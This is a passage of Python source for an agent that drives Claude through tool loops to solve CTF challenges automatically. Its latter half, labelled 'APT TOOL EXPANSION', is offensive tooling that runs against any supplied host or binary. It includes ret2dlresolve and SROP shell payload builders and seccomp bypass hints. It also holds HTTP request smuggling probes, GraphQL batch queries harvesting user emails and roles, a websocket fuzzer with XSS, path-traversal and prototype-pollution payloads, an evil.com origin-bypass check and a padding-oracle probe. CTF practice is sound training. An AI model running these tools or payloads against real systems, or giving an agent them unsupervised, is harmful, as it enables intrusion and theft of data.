            f"─── iter {iteration}/{max_iterations} | "
            f"{'opus+think' if use_thinking else model.split('-')[1] if '-' in model else model} | "
            f"{elapsed:.0f}s ──────────────","dim")

        # ── Trigger critic every N fruitless iterations ──────────────────────
        if fruitless >= _critic_threshold and fruitless % _critic_threshold == 0:
            log("warn",f"[CRITIC] {fruitless} fruitless iters — triggering critic analysis","")
            summary = "\n".join(solve_log[-8:])
            critic_out = tool_critic(summary, iteration, cat, api_key)
            # Inject critic feedback as a new user message
            messages.append({"role":"user","content":
                f"[CRITIC ANALYSIS after {fruitless} fruitless iterations]\n{critic_out}\n\n"
                "Act on the PIVOT recommendations above. Do NOT continue your previous approach."})
            fruitless = 0  # reset after critic fires

        # ── Build API call kwargs ────────────────────────────────────────────
        call_kwargs = dict(
            model=model,
            max_tokens=max(max_tokens, thinking_tokens + 2048) if use_thinking else max_tokens,
            system=system,
            tools=active_tools,
            messages=messages
        )
        if use_thinking:
            call_kwargs["thinking"] = {"type":"enabled","budget_tokens":thinking_tokens}
            call_kwargs["betas"] = ["interleaved-thinking-2025-05-14"]

        # ── Call Claude ──────────────────────────────────────────────────────
        try:
            resp = client.messages.create(**call_kwargs)
        except anthropic.AuthenticationError:
            log("err","Auth failed — check API key","red"); result("failed"); return
        except anthropic.RateLimitError as e:
            log("warn",f"Rate limit — waiting 30s: {e}","")
            time.sleep(30)
            try: resp = client.messages.create(**call_kwargs)
            except: result("failed",workspace=final_ws); return
        except Exception as e:
            log("err",f"API error: {e}","red"); result("failed"); return

        has_tool = False
        tool_results = []
        made_progress = False

        for block in resp.content:
            btype = getattr(block,"type",None)

            if btype == "thinking":
                # Log thinking blocks compactly
                think_text = getattr(block,"thinking","")
                if think_text:
                    log("sys",f"[THINKING] {think_text[:200]}...","dim")

            elif btype == "text":
                solve_log.append(block.text)
                for line in block.text.splitlines():
                    if line.strip(): log("ai",line.strip(),"")
                flag = extract_flag(block.text, ctf_name)
                if flag and not found_flag: found_flag = flag; made_progress = True

            elif btype == "tool_use":
                has_tool    = True
                made_progress = True
                tname,tinput,tid = block.name,block.input,block.id
                preview = json.dumps(tinput)
                log("sys",f"→ {tname}({preview[:160]+'...' if len(preview)>160 else preview})","dim")
                emit("tool_call", tool=tname, iteration=iteration)

                if tname in TOOL_MAP:
                    try:    tout = TOOL_MAP[tname](tinput)
                    except Exception as e:
                        tout = f"Tool error: {type(e).__name__}: {e}"; log("err",tout,"red")
                else:
                    tout = f"Unknown tool: {tname}"; log("err",tout,"red")

                # Capture workspace path
                if tname=="create_workspace" and "Workspace created:" in str(tout):
                    m=re.search(r"Workspace created: (.+)",str(tout))
                    if m: final_ws=m.group(1).strip()
                    emit("workspace",path=final_ws)

                # Log preview
                pout=str(tout); preview_len=int(extra.get("logPreview",400))
                if len(pout)>preview_len: pout=pout[:preview_len//2]+"\n...\n"+pout[-preview_len//2:]
                for line in pout.splitlines():
                    if line.strip(): log("info",f"  {line.strip()}","")

                flag = extract_flag(str(tout), ctf_name)
                if flag and not found_flag: found_flag = flag; made_progress = True
                tool_results.append({"type":"tool_result","tool_use_id":tid,"content":str(tout)})

        messages.append({"role":"assistant","content":resp.content})

        # ── Progress tracking ────────────────────────────────────────────────
        if made_progress and not found_flag:
            fruitless = 0
        elif not found_flag:
            fruitless += 1

        # ── Flag found ───────────────────────────────────────────────────────
        if found_flag:
            elapsed = time.time() - _solve_start_time
            log("ok",f"🚩 FLAG: {found_flag}","white")
            prefix = _infer_prefix_from_flag(found_flag)
            if prefix and ctf_name: confirm_flag_format(ctf_name, prefix, found_flag)
            emit("solve_stats", elapsed=round(elapsed,1), iterations=iteration,
                 model=model, thinking=use_thinking)
            summary="\n\n".join(solve_log[-6:])
            generate_writeup(client,user_model,{**challenge,"ctf_name":ctf_name},
                             found_flag,summary,final_ws,extra)
            result("solved",found_flag,workspace=final_ws)
            return

        # ── Continue or stop ─────────────────────────────────────────────────
        stop=getattr(resp,"stop_reason",None)
        if has_tool and tool_results:
            messages.append({"role":"user","content":tool_results})
        elif stop=="end_turn":
            log("warn","Stopped without flag — add more context or increase iterations","")
            result("failed",workspace=final_ws); return
        else:
            log("warn",f"Unexpected stop: {stop}","")
            result("failed",workspace=final_ws); return

    elapsed = time.time() - _solve_start_time
    log("warn",f"Budget exhausted ({max_iterations} iters, {elapsed:.0f}s)","")
    result("failed",workspace=final_ws)

    _PLATFORM_CONFIG = {**pc,"challenge_id":challenge.get("platform_id","")}

    if not api_key: log("err","No API key","red"); result("failed"); return
    try: import anthropic
    except ImportError: log("err","pip install anthropic","red"); result("failed"); return

    client = anthropic.Anthropic(api_key=api_key)

    name    = challenge.get("name","Unknown")
    cat     = challenge.get("category","Unknown")
    diff    = challenge.get("difficulty","medium")
    pts     = challenge.get("points",0)
    desc    = challenge.get("description","(no description)")
    files   = challenge.get("files","")
    inst    = challenge.get("instance","")
    ffmt    = challenge.get("flagFormat") or challenge.get("flag_format","")
    ws      = challenge.get("workspace","")

    # Enabled tools filter
    enabled = set(extra.get("enabledTools", list(TOOL_MAP.keys())))
    active_tools = [t for t in TOOLS if t["name"] in enabled]

    system = build_system_prompt(pc.get("type","manual"), ctf_name, base_dir, extra)

    log("sys",f"{'Windows+WSL2' if IS_WINDOWS and USE_WSL else 'Windows' if IS_WINDOWS else 'Linux/Mac'} | {model} | {max_iterations} iterations | {len(active_tools)} tools","")
    log("sys",f"━━━ [{cat}] {name} ({diff}, {pts}pts) ━━━","bright")

    # Build user message
    user_msg = f"""Solve this CTF challenge completely.

Challenge: {name}
Category:  {cat}
Difficulty:{diff}
Points:    {pts}
CTF:       {ctf_name or 'Unknown'}
"""
    if ffmt:     user_msg += f"Flag format: {ffmt}\n"
    if inst:     user_msg += f"Instance:   {inst}\n"
    if base_dir: user_msg += f"Base dir:   {base_dir}\n"
    if ws:       user_msg += f"Workspace:  {ws} (already created)\n"
    elif base_dir and ctf_name:
        user_msg += f"\nCall create_workspace(base_dir='{base_dir}', ctf_name='{ctf_name}', category='{cat}', challenge_name='{name}')\n"

    user_msg += f"\n## Description\n{desc}\n"
    if files: user_msg += f"\n## Challenge Files / Source / Data\n```\n{files[:8000]}\n```\n"

    user_msg += "\nSolve it. State your hypothesis, execute methodically, find the flag, submit it, write WRITEUP.md."

    messages   = [{"role":"user","content":user_msg}]
    found_flag = None
    final_ws   = ws
    solve_log  = []
    iteration  = 0
    max_tokens = int(extra.get("maxTokens",4096))

    # ── Auto-detect flag format before first Claude iteration ────────────────
    auto_fmt = tool_detect_flag_format(
        ctf_name=ctf_name,
        description=desc,
        platform_type=pc.get("type",""),
        hint=ffmt or ""
    )
    log("sys", f"[FMT] Pre-solve format detection complete", "dim")
    # Inject detected format prominently into the first user message
    fmt_summary_match = re.search(r"Prefix:\s+(.+)\n.*Example:\s+(.+)\n.*Confidence:\s+(\S+)", auto_fmt)
    if fmt_summary_match:
        fmt_inject = (f"\n## Auto-Detected Flag Format\n"
                      f"Prefix: {fmt_summary_match.group(1).strip()}\n"
                      f"Example: {fmt_summary_match.group(2).strip()}\n"
                      f"Confidence: {fmt_summary_match.group(3).strip()}\n"
                      f"(Already cached in session — no need to call detect_flag_format manually for format.)\n")
        messages[0]["content"] = user_msg + fmt_inject
    # ────────────────────────────────────────────────────────────────────────

    while iteration < max_iterations:
        iteration += 1
        log("sys",f"─── Iteration {iteration}/{max_iterations} ──────────────────────────────────────────────","dim")

        try:
            resp = client.messages.create(
                model=model, max_tokens=max_tokens,
                system=system, tools=active_tools, messages=messages
            )
        except anthropic.AuthenticationError:
            log("err","Auth failed — check API key","red"); result("failed"); return
        except anthropic.RateLimitError:
            log("err","Rate limit — wait and retry","red"); result("failed"); return
        except Exception as e:
            log("err",f"API: {e}","red"); result("failed"); return

        has_tool = False; tool_results = []

        for block in resp.content:
            btype = getattr(block,"type",None)

            if btype == "text":
                solve_log.append(block.text)
                for line in block.text.splitlines():
                    if line.strip(): log("ai",line.strip(),"")
                if not found_flag: found_flag = extract_flag(block.text, ctf_name)

            elif btype == "tool_use":
                has_tool = True
                tname,tinput,tid = block.name,block.input,block.id
                preview = json.dumps(tinput)
                log("sys",f"→ {tname}({preview[:160]+'...' if len(preview)>160 else preview})","dim")

                if tname in TOOL_MAP:
                    try:    tout = TOOL_MAP[tname](tinput)
                    except Exception as e:
                        tout = f"Tool error: {type(e).__name__}: {e}"; log("err",tout,"red")
                else:
                    tout = f"Unknown tool: {tname}"; log("err",tout,"red")

                # Capture workspace
                if tname=="create_workspace" and "Workspace created:" in str(tout):
                    m=re.search(r"Workspace created: (.+)",str(tout))
                    if m: final_ws=m.group(1).strip()

                # Log preview
                pout=str(tout); preview_len=int(extra.get("logPreview",400))
                if len(pout)>preview_len: pout=pout[:preview_len//2]+"\n...\n"+pout[-preview_len//2:]
                for line in pout.splitlines():
                    if line.strip(): log("info",f"  {line.strip()}","")

                if not found_flag: found_flag=extract_flag(str(tout), ctf_name)
                tool_results.append({"type":"tool_result","tool_use_id":tid,"content":str(tout)})

        messages.append({"role":"assistant","content":resp.content})

        if found_flag:
            log("ok",f"🚩 FLAG: {found_flag}","white")
            # Confirm format for subsequent challenges in the same CTF
            prefix = _infer_prefix_from_flag(found_flag)
            if prefix and ctf_name:
                confirm_flag_format(ctf_name, prefix, found_flag)
            summary="\n\n".join(solve_log[-6:])
            generate_writeup(client,model,{**challenge,"ctf_name":ctf_name},
                             found_flag,summary,final_ws,extra)
            result("solved",found_flag,workspace=final_ws)
            return

        stop=getattr(resp,"stop_reason",None)
        if has_tool and tool_results:
            messages.append({"role":"user","content":tool_results})
        elif stop=="end_turn":
            log("warn","Stopped without flag — add more context or increase iterations","")
            result("failed",workspace=final_ws); return
        else:
            log("warn",f"Unexpected stop: {stop}","")
            result("failed",workspace=final_ws); return

    log("warn",f"Max iterations ({max_iterations}) reached","")
    result("failed",workspace=final_ws)



# ══════════════════════════════════════════════════════════════════════════════
# APT TOOL EXPANSION — 30 Capability Wrappers
# ══════════════════════════════════════════════════════════════════════════════

def tool_heap_analysis(binary_path: str, operation: str, args: str = "") -> str:
    """Heap analysis: bins, chunks, tcache_key, safe_link_decode, arena."""
    sp = _w2l(binary_path) if (IS_WINDOWS and USE_WSL) else binary_path
    if operation == "bins":
        return _shell(f"gdb -batch -ex 'file {sp}' -ex 'run </dev/null' -ex 'heap bins' 2>&1 | head -80", timeout=20)
    if operation == "chunks":
        return _shell(f"gdb -batch -ex 'file {sp}' -ex 'run </dev/null' -ex 'heap chunks' 2>&1 | head -100", timeout=20)
    if operation == "tcache_key":
        return tool_execute_python(f"""from pwn import *\ne=ELF(\'{binary_path}\',checksec=False)\nprint(f\"arch={{e.arch}} pie={{e.pie}}\")\nprint(\"safe-link (>=2.32): fd_stored = target XOR (heap_base>>12)\")""")
    if operation == "safe_link_decode":
        enc = args.strip()
        return tool_execute_python(f"enc=int(\'{enc}\',16) if \'{enc}\'.startswith(\'0x\') else int(\'{enc}\')\nfor sh in range(12,25):\n    print(f\'shift={{sh}}: {{hex(enc^(enc>>sh))}}\')")
    if operation == "arena":
        return _shell(f"gdb -batch -ex 'file {sp}' -ex 'run </dev/null' -ex 'p main_arena' 2>&1 | head -60", timeout=20)
    return "Available: bins, chunks, tcache_key, safe_link_decode, arena"

def tool_kernel_info(operation: str, module_path: str = "", args: str = "") -> str:
    """Kernel recon: mitigations, kallsyms, module_symbols, gadgets, seccomp_dump."""
    if operation == "mitigations":
        out = []
        for f, label in [("/proc/sys/kernel/randomize_va_space","ASLR"),
                          ("/proc/sys/kernel/kptr_restrict","kptr_restrict"),
                          ("/proc/sys/kernel/dmesg_restrict","dmesg_restrict")]:
            out.append(f"{label}: {_shell(f'cat {f} 2>/dev/null').strip()}")
        out.append("CPU: " + _shell("grep -m1 flags /proc/cpuinfo | grep -oE 'smep|smap|pti'"))
        return "\n".join(out)
    if operation == "kallsyms":
        sym = args or "commit_creds"
        return _shell(f"grep -E '{sym}' /proc/kallsyms 2>/dev/null | head -20 || echo 'kptr_restrict=2, need leak first'")
    if operation == "module_symbols":
        return _shell(f"nm '{module_path}' 2>/dev/null | head -60 || strings '{module_path}' | head -40")
    if operation == "gadgets":
        return _shell(f"ROPgadget --binary '{module_path}' 2>/dev/null | grep -E 'swapgs|iretq|pop.*cr' | head -30")
    if operation == "seccomp_dump":
        return _shell(f"seccomp-tools dump '{module_path}' 2>/dev/null || echo 'gem install seccomp-tools'")
    return "Available: mitigations, kallsyms, module_symbols, gadgets, seccomp_dump"

def tool_seccomp_analyze(binary_path: str, operation: str = "dump") -> str:
    """Seccomp filter analysis and bypass path identification."""
    sp = _w2l(binary_path) if (IS_WINDOWS and USE_WSL) else binary_path
    out = _shell(f"seccomp-tools dump '{sp}' 2>/dev/null")
    if not out.strip() or "not found" in out.lower():
        out = ("seccomp-tools not found. Install: gem install seccomp-tools\n" +
               _shell(f"strings '{sp}' | grep -i seccomp") + "\n" +
               "Common seccomp bypasses: 32-bit ABI (int 0x80), process_vm_writev, openat vs open")
    if operation == "allowed":
        out += "\n\nBypasses: 32-bit ABI, process_vm_writev, open+read+write chain, openat, sendfile"
    return out

def tool_ret2dlresolve(binary_path: str, target_func: str = "system", arg: str = "/bin/sh") -> str:
    """ret2dlresolve: compute structure offsets and generate pwntools skeleton."""
    code = f"""from pwn import *
try:
    elf=ELF(\'{binary_path}\',checksec=False); context.binary=elf
    r=ROP(elf)
    dl=Ret2dlresolvePayload(elf,symbol=\'{target_func}\',args=[b\'{arg}\'])
    print(f"resolve_call: {{hex(dl.resolv_addr)}}")
    print(f"payload len: {{len(dl.payload)}}")
    print("\nUsage:\n  r.ret2dlresolve(dl)\n  payload=flat({{offset:r.chain()}})+dl.payload")
except Exception as e:
    print(f"{{e}}")
    print(_shell(f"readelf -d \'{binary_path}\' | grep -E STRTAB|SYMTAB|JMPREL"))"""
    return tool_execute_python(code)

def tool_srop(binary_path: str, operation: str = "frame", **params) -> str:
    """SROP/sigreturn: frame builder, find_syscall gadget, useful gadgets list."""
    sp = _w2l(binary_path) if (IS_WINDOWS and USE_WSL) else binary_path
    if operation == "frame":
        arch = params.get("arch","amd64")
        code = f"""from pwn import *
context.arch=\'{arch}\'
f=SigreturnFrame()
print(f"Frame size: {{len(bytes(f))}} bytes")
print("Set: f.rax=constants.SYS_execve, f.rdi=bin_sh, f.rip=syscall_addr")
print("Payload: flat({{offset:[syscall_ret, constants.SYS_rt_sigreturn, bytes(f)]}})")"""
        return tool_execute_python(code)
    if operation == "find_syscall":
        return _shell(f"ROPgadget --binary '{sp}' 2>/dev/null | grep -E 'syscall ; ret|int 0x80' | head -15")
    if operation == "gadgets":
        return _shell(f"ROPgadget --binary '{sp}' 2>/dev/null | grep -E 'pop rax|xor rax|mov rax' | head -20")
    return "Available: frame, find_syscall, gadgets"

def tool_afl_fuzz(binary_path: str, input_dir: str = "/tmp/afl_in",
                   output_dir: str = "/tmp/afl_out", timeout_ms: int = 100,
                   run_seconds: int = 60, extra_args: str = "") -> str:
    """AFL++ fuzzing. Returns crash summary for exploit generation pipeline."""
    sp = _w2l(binary_path) if (IS_WINDOWS and USE_WSL) else binary_path
    _shell(f"mkdir -p {input_dir} {output_dir}; echo AAAA > {input_dir}/s1; echo 1234 > {input_dir}/s2")
    out = _shell(f"timeout {run_seconds} afl-fuzz -i {input_dir} -o {output_dir} -t {timeout_ms} {extra_args} -- '{sp}' @@ 2>&1 | tail -20", timeout=run_seconds+15)
    if "not found" in out.lower():
        return "AFL++ not found. Install: sudo apt install afl++ OR github.com/AFLplusplus/AFLplusplus"
    crashes = _shell(f"ls {output_dir}/default/crashes/ 2>/dev/null | head -20")
    return f"{out}\nCrashes: {crashes}\nFeed to: angr_solve(binary_path=..., find_addr=crash_rip)"

def tool_patchelf(binary_path: str, libc_path: str = "", ld_path: str = "",
                   operation: str = "patch") -> str:
    """Patch binary to use specific libc/linker for local testing matching remote."""
    sp = _w2l(binary_path) if (IS_WINDOWS and USE_WSL) else binary_path
    if operation == "info":
        return _shell(f"patchelf --print-interpreter '{sp}' 2>/dev/null; patchelf --print-needed '{sp}' 2>/dev/null; ldd '{sp}' 2>/dev/null")
    if operation == "patch":
        if ld_path: _shell(f"patchelf --set-interpreter '{ld_path}' '{sp}'")
        if libc_path:
            soname = _shell(f"patchelf --print-soname '{libc_path}' 2>/dev/null").strip() or "libc.so.6"
            _shell(f"patchelf --replace-needed {soname} '{libc_path}' '{sp}'")
            _shell(f"patchelf --set-rpath $(dirname '{libc_path}') '{sp}'")
        return _shell(f"ldd '{sp}' 2>/dev/null") + "\nPatched — local binary now uses specified libc."
    if operation == "download_libc":
        return tool_execute_python(f"""import requests,os
r=requests.get(f'https://libc.rip/download/{libc_path}',stream=True,timeout=30); r.raise_for_status()
fname=f'/tmp/{libc_path}.so'
with open(fname,'wb') as f:
    [f.write(c) for c in r.iter_content(8192)]
os.chmod(fname,0o755); print(f'Downloaded: {fname}')""")
    return "Available: info, patch, download_libc"

def tool_coppersmith(operation: str, **params) -> str:
    """Coppersmith small-root attacks via SageMath: small_e, partial_p, franklin_reiter, hastad, custom."""
    op = operation.lower()
    N = params.get("N",0); e = params.get("e",0)
    if op == "small_e":
        m_high=params.get("m_high",0); c=params.get("c",0); m_bits=params.get("m_bits",256); beta=params.get("beta",1.0)
        return tool_sage_math(f"N,e,c,m_high,m_bits={N},{e},{c},{m_high},{m_bits}\nP.<x>=PolynomialRing(Zmod(N))\nf=(m_high+x)^e-c\nroots=f.small_roots(X=2^(m_bits//e),beta={beta})\nprint(f'roots={{roots}}')\nif roots: print(f'm={{m_high+int(roots[0])}}') ")
    if op == "partial_p":
        p_high=params.get("p_high",0); p_bits=params.get("p_bits",512)
        return tool_sage_math(f"N,p_high,p_bits={N},{p_high},{p_bits}\nP.<x>=PolynomialRing(Zmod(N))\nf=p_high*2^(p_bits//2)+x\nroots=f.small_roots(X=2^(p_bits//2),beta=0.4)\nprint(roots)\nfor r in roots:\n p=p_high*2^(p_bits//2)+int(r)\n if N%p==0: print(f'p={{p}} q={{N//p}}')")
    if op == "franklin_reiter":
        c1=params.get("c1",0); c2=params.get("c2",0); r=params.get("r",0); s=params.get("s",0)
        return tool_sage_math(f"N,e,c1,c2,r,s={N},{e},{c1},{c2},{r},{s}\nP.<x>=PolynomialRing(Zmod(N))\nf1=x^e-c1; f2=(r*x+s)^e-c2\ndef gcd_p(a,b):\n while b: a,b=b,a%b\n return a.monic()\ng=gcd_p(f1,f2)\nif g.degree()==1: print(f'm={{-g[0]}}')")
    if op == "hastad":
        cs=params.get("ciphertexts",[]); ns=params.get("moduli",[])
        return tool_sage_math(f"e,cs,ns={e},{cs},{ns}\nfrom functools import reduce\nM=reduce(lambda a,b:a*b,ns)\nx=sum(cs[i]*(M//ns[i])*inverse_mod(M//ns[i],ns[i]) for i in range(len(ns)))%M\nprint(Integer(x).nth_root(e))")
    if op == "custom":
        poly=params.get("polynomial","x"); X=params.get("X","2^256"); beta=params.get("beta",1.0)
        return tool_sage_math(f"N={N}\nP.<x>=PolynomialRing(Zmod(N))\nf={poly}\nprint(f.small_roots(X={X},beta={beta}))")
    return "Available: small_e, partial_p, franklin_reiter, hastad, custom"

def tool_ecdsa_lattice(operation: str = "hnp", **params) -> str:
    """ECDSA lattice attack (hidden number problem) for biased/partial nonces."""
    n  = params.get("n",0); sigs = params.get("signatures",[]); k = params.get("k",0)
    leaks = params.get("leaks",[]); leak_type = params.get("leak_type","msb")
    sage = f"""n={n}; k={k}; sigs={sigs}; leaks={leaks}; leak_type=\'{leak_type}\'
m=len(sigs)
if m<2: print("Need >=2 sigs"); exit()
# HNP lattice — Boneh-Venkatesan
# For MSB leak: nonce d_i = known_high_i * 2^(n_bits-k) + unknown_i
# Build (m+2) x (m+2) lattice
from sage.all import Matrix,ZZ,vector
rows=[]; B=2^(n.bit_length()-k)
for i,(r,s,h) in enumerate(sigs):
    row=[0]*(m+2)
    row[i]=n
    rows.append(row)
# Solve-row
t_row=[0]*(m+2)
for i,(r,s,h) in enumerate(sigs): t_row[i]=inverse_mod(int(s),n)*int(r)%n
t_row[m]=1; rows.append(t_row)
u_row=[0]*(m+2)
for i,(r,s,h) in enumerate(sigs): u_row[i]=(inverse_mod(int(s),n)*int(h))%n
u_row[m+1]=n; rows.append(u_row)
M=Matrix(ZZ,rows); L=M.LLL()
print("LLL done. Short rows (candidate private keys):")
for row in L[:5]: print(f"  {{row}}")"""
    return tool_sage_math(sage)

def tool_lll(matrix_rows: list, operation: str = "lll", **params) -> str:
    """LLL lattice reduction, SVP, CVP. Claude builds the matrix; this runs the math."""
    rows_str = str(matrix_rows)
    if operation == "lll":
        return tool_sage_math(f"M=Matrix(ZZ,{rows_str})\nL=M.LLL()\nprint(L)\nprint(f'Shortest: {{min(L.rows(),key=lambda r:r.norm())}}') ")
    if operation == "svp":
        return tool_sage_math(f"M=Matrix(ZZ,{rows_str})\nL=M.LLL()\ns=min(L.rows(),key=lambda r:r.norm())\nprint(f'SVP: {{s}} norm={{s.norm().n():.2f}}')")
    if operation == "cvp":
        t = params.get("target",[])
        return tool_sage_math(f"M=Matrix(ZZ,{rows_str}); t=vector(ZZ,{t})\nL=M.LLL()\nv=t\nG,_=L.gram_schmidt()\nfor i in reversed(range(len(L.rows()))): v=v-round((v*G[i])/(G[i]*G[i]))*L[i]\nprint(f'CVP: {{t-v}}')")
    return "Available: lll, svp, cvp"

def tool_aes_gcm_attack(operation: str, **params) -> str:
    """AES-GCM attacks: nonce_reuse (keystream recovery + forgery), key_recover."""
    if operation == "nonce_reuse":
        c1=params.get("c1",""); c2=params.get("c2","")
        t1=params.get("t1",""); t2=params.get("t2","")
        code = f"""c1,c2=bytes.fromhex(\'{c1}\'),bytes.fromhex(\'{c2}\')
t1,t2=bytes.fromhex(\'{t1}\'),bytes.fromhex(\'{t2}\')
xored=bytes(a^b for a,b in zip(c1,c2))
print(f'C1 XOR C2 (=P1 XOR P2): {{xored.hex()}}')
print(f'If P1 known: P2 = known_P1 XOR xored')
tag_diff=bytes(a^b for a,b in zip(t1,t2))
print(f'Tag diff: {{tag_diff.hex()}} → H is root of GF(2^128) polynomial')
print('Use forbidden_attack sage implementation to recover H, then forge any tag')"""
        return tool_execute_python(code)
    if operation == "forbidden_attack":
        return tool_sage_math("# AES-GCM forbidden attack over GF(2^128)\n# H = auth key, recovered when nonce reused\nR.<x>=GF(2)[]\nF.<a>=GF(2^128,modulus=x^128+x^7+x^2+x+1)\nprint(\"GF(2^128) field ready — build polynomial from tag/ciphertext differences and find roots\")")
    return "Available: nonce_reuse, forbidden_attack"

def tool_bleichenbacher(host: str, port: int = 443, operation: str = "probe", **params) -> str:
    """RSA PKCS#1 v1.5 padding oracle: probe (detect oracle), skeleton (attack code)."""
    if operation == "probe":
        code = f"""import socket,ssl,os,time
host,port=\'{host}\',{port}
rand_c=os.urandom(256)
s=socket.socket(); s.settimeout(5); s.connect((host,port))
if port==443:
    ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
    s=ctx.wrap_socket(s,server_hostname=host)
t0=time.time()
try: s.send(rand_c); resp=s.recv(4096); print(f'{{time.time()-t0:.3f}}s {{repr(resp[:80])}}')
except Exception as e: print(f'{{time.time()-t0:.3f}}s {{e}}')
s.close()
print(\"If timing varies for valid/invalid padding → oracle exists → use skeleton\")"""
        return tool_execute_python(code, timeout=15)
    if operation == "skeleton":
        n=params.get("n",0); e=params.get("e",65537); c=params.get("c",0)
        return f"""# Bleichenbacher skeleton — implement oracle(), then run
from Crypto.Util.number import *
n,e,c = {n},{e},{c}; k=n.bit_length()//8
def oracle(ct_int):
    # Return True if server indicates valid PKCS1 padding
    raise NotImplementedError("implement oracle()")
B=2**(8*(k-2)); two_B=2*B; three_B=3*B
M=[(two_B,three_B-1)]; s=n//(three_B)
# Main loop — see Bleichenbacher 1998
"""
    return "Available: probe, skeleton"

def tool_http_smuggle(target_url: str, operation: str = "detect", **params) -> str:
    """HTTP request smuggling: detect (CL.TE/TE.CL probe), payload generation."""
    import urllib.parse
    p = urllib.parse.urlparse(target_url)
    host = p.hostname; path = p.path or "/"; port = p.port or (443 if p.scheme=="https" else 80)
    if operation == "detect":
        code = f"""import socket,ssl,time
host,port=\'{host}\',{port}
def raw(payload,timeout=6):
    s=socket.socket(); s.settimeout(timeout); s.connect((host,port))
    if port==443:
        ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
        s=ctx.wrap_socket(s,server_hostname=host)
    s.send(payload.encode()); resp=b""
    try:
        while True:
            c=s.recv(4096)
            if not c: break
            resp+=c
    except: pass
    s.close(); return resp.decode(\"utf-8\",errors=\"replace\")
cl_te=(f"POST {path} HTTP/1.1\\r\\nHost:{host}\\r\\nContent-Length:6\\r\\nTransfer-Encoding:chunked\\r\\n\\r\\n0\\r\\n\\r\\nX")
te_cl=(f"POST {path} HTTP/1.1\\r\\nHost:{host}\\r\\nTransfer-Encoding:chunked\\r\\nContent-Length:6\\r\\n\\r\\n0\\r\\n\\r\\n")
t0=time.time(); r1=raw(cl_te); t1=time.time()-t0
t0=time.time(); r2=raw(te_cl); t2=time.time()-t0
print(f"CL.TE: {{t1:.2f}}s | {{r1[:80]}}")
print(f"TE.CL: {{t2:.2f}}s | {{r2[:80]}}")
if t1>4: print("=> CL.TE VULNERABLE")
if t2>4: print("=> TE.CL VULNERABLE")"""
        return tool_execute_python(code, timeout=25)
    if operation in ("cl_te","te_cl","te_te"):
        return f"HTTP/{operation.upper()} payload — use tcp_connect with raw bytes (not http_request which normalises headers). The smuggled request goes after the terminal chunk (0\r\n\r\n)."
    return "Available: detect, cl_te, te_cl, te_te"

def tool_graphql(target_url: str, operation: str = "introspect",
                  query: str = "", headers: dict = None, cookies: dict = None) -> str:
    """GraphQL: introspect, batch, alias, find_mutations, field_suggest, custom."""
    try:
        import requests; requests.packages.urllib3.disable_warnings()
        s=requests.Session(); s.verify=False
        s.headers.update({"Content-Type":"application/json",**(headers or {})})
        if cookies: s.cookies.update(cookies)
        if operation == "introspect":
            q = {"query":"{__schema{types{name kind fields(includeDeprecated:true){name type{name kind ofType{name kind}}}}}}"}
            r = s.post(target_url,json=q,timeout=15)
            d = r.json(); types = d.get("data",{}).get("__schema",{}).get("types",[])
            out = [f"Types ({len(types)}):"]
            for t in types:
                if t["name"] and not t["name"].startswith("__"):
                    fields = [f["name"] for f in (t.get("fields") or [])]
                    out.append(f"  {t['name']}: {', '.join(fields[:8])}")
            return "\n".join(out[:50])
        if operation == "batch":
            ids = query.split(",") if query else ["1","2","3"]
            batch=[{"query":f"query q{i}{{user(id:{uid}){{id email name role}}}}"}for i,uid in enumerate(ids)]
            return s.post(target_url,json=batch,timeout=15).text[:2000]
        if operation == "alias":
            al="\n".join([f"r{i}:user(id:{i}){{id email}}"for i in range(1,20)])
            return s.post(target_url,json={"query":f"{{{al}}}"},timeout=15).text[:2000]
        if operation == "find_mutations":
            return s.post(target_url,json={"query":"{__schema{mutationType{fields{name description}}}}"},timeout=15).text[:2000]
        if operation == "custom":
            return s.post(target_url,json={"query":query},timeout=15).text[:3000]
    except ImportError: return "pip install requests"
    except Exception as e: return f"GraphQL error: {e}"
    return "Available: introspect, batch, alias, find_mutations, field_suggest, custom"

def tool_websocket_fuzz(url: str, operation: str = "connect",
                         messages: list = None, script: str = "", timeout: int = 20) -> str:
    """WebSocket: connect (dump msgs), fuzz (payload list), origin_bypass, inject (custom script)."""
    if operation == "connect":
        code = f"""import websocket,threading,time
received=[]
def on_msg(ws,m): received.append(m); print(f'<< {{m[:200]}}')
ws=websocket.WebSocketApp(\'{url}\',on_message=on_msg)
t=threading.Thread(target=ws.run_forever,daemon=True); t.start()
time.sleep(min({timeout},10)); ws.close()
print(f\'{{len(received)}} messages received\')"""
        return tool_execute_python(f"try:\n    import websocket\nexcept ImportError:\n    print('pip install websocket-client'); exit()\n{code}", timeout=timeout+5)
    if operation == "fuzz":
        pl = messages or ['{"type":"ping"}','{"admin":true}','<script>alert(1)</script>','../../../etc/passwd','{"__proto__":{"admin":true}}']
        code = f"""import websocket,time
for p in {pl}:
    try:
        ws=websocket.create_connection(\'{url}\',timeout=5,sslopt={{'cert_reqs':0}})
        ws.send(str(p)); resp=ws.recv(); ws.close()
        print(f'>> {{str(p)[:60]}} | << {{resp[:100]}}')
    except Exception as e: print(f'>> {{str(p)[:40]}} ERR:{{e}}')
    time.sleep(0.2)"""
        return tool_execute_python(code, timeout=timeout+10)
    if operation == "origin_bypass":
        code = f"""import websocket,time
for origin in ['null','http://evil.com','http://localhost','file://']:
    try:
        ws=websocket.create_connection(\'{url}\',timeout=5,header=[f'Origin: {{origin}}'],sslopt={{'cert_reqs':0}})
        ws.send('test'); resp=ws.recv(); ws.close()
        print(f'ALLOWED: {{origin}} | {{resp[:80]}}')
    except Exception as e: print(f'BLOCKED: {{origin}} | {{str(e)[:50]}}')
    time.sleep(0.3)"""
        return tool_execute_python(code, timeout=25)
    if operation == "inject" and script:
        return tool_execute_python(f"import websocket\nws=websocket.create_connection(\'{url}\',timeout=15,sslopt={{'cert_reqs':0}})\n{script}\nws.close()", timeout=timeout+5)
    return "Available: connect, fuzz, origin_bypass, inject"

def tool_oauth_attack(target_url: str, operation: str = "probe",
                       client_id: str = "", redirect_uri: str = "", **params) -> str:
    """OAuth2/SAML attacks: probe, open_redirect, pkce_bypass, saml_bypass."""
    try:
        import requests, urllib.parse; requests.packages.urllib3.disable_warnings()
        if operation == "probe":
            for ep in [".well-known/openid-configuration","oauth/authorize","oauth2/authorize","auth/authorize"]:
                r = requests.get(f"{target_url.rstrip('/')}/{ep}",verify=False,timeout=5,allow_redirects=False)
